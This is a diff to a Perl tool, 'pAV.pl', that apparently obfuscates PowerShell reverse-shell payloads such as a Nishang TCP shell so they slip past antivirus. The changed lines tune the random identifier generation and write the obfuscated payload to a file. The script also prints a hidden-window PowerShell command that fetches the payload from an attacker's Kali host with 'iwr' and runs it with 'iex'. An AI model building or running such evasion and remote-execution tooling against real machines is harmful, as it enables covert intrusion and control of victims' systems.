@@ -1,4 +1,5 @@
 #!/usr/bin/perl
+#spoNge369 2023
 
 use warnings;
 use strict;
@@ -19,8 +20,8 @@ my $mode                = "";
 my $help                = 0;
 
 my @keyR;
-my $keyMin              = 3;
-my $keyMax              = 7;
+my $keyMin              = 7;
+my $keyMax              = 12;
 my @obf;
 
 
@@ -85,7 +86,7 @@ sub help {
    / __ \/ /| | | / / 
   / /_/ / ___ | |/ /  
  / .___/_/  |_|___/ 
-/_/                 v1.0 
+/_/            beta v1.0 
 pav
     print BOLD GREEN, $pav, RESET.<<"HELP";
                     I don't anything E`vI`l, I just write ungly.
@@ -106,7 +107,7 @@ pav
     Examples:
 
 perl pAV.pl -i 10.0.1.232 -p 7878 -l 0.5
-perl av.pl -i 10.0.1.232 -r nishangTcp.ps1 -ko obf.txt "'" -kr random.txt 3 10
+perl pAV.pl -i 10.0.1.232 -r nishangTcp.ps1 -ko obf.txt "'" -kr random.txt 3 10
 HELP
 
     exit 1;
@@ -254,7 +255,8 @@ my @xd;
 #print scalar(@keyword)."\n";
 foreach(my $i=0; $i<scalar(@keyR); $i++) {
     my $len = $keyMin+int(rand($keyMax));
-    my $ra = $string->randregex("[a-z]{$len}[0-9]{$len}[A-Z]{$len}");
+    XDD: my $ra = $string->randregex("[_a-z0-9A-Z_]{$len}");
+    goto XDD if($ra=~m/^[0-9]/);
     push @xd, $ra;
 }
 
@@ -269,7 +271,7 @@ my $powershell=noSy("powershell");
 my $WindowStyle=uppLower("-WindowStyle");
 my $Hidden=noSy("Hidden");
 my $Args=uppLower("-Args");
-my $iwr=newReverse("iwr");
+my $iwr=noSy("iwr");
 
 #print $iex;
 if(scalar(@keyword_obf) ne 2) {
@@ -302,4 +304,5 @@ print "$startProcess $powershell $WindowStyle $Hidden $Args {$payload}";
 print "\n\nRemote:\n$startProcess $powershell $WindowStyle $Hidden $Args".
         "{$iwr -useb IP_KALI:PORT/output_pav.ps1|$iex}\n";
 
-open(BODY, '>', "./output_pav.ps1") or d
+open(BODY, '>', "./output_pav.ps1") or die $!;
+print BODY $payload;
